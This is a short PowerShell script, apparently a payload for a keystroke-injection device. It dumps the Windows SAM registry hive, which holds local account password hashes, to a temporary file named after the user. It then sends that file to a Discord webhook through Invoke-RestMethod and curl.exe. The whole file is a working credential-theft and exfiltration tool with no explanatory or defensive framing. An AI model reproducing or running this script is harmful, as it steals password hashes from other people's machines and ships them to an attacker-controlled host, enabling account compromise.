$Fich = "$env:tmp/$env:USERNAME-SAM-$(get-date -f yyyy-MM-dd_hh-mm ).txt"
$CO = "reg save hklm\sam $Fich"
Invoke-Expression -Command $CO

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$didi = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $didi  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $didi}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$Fich"}
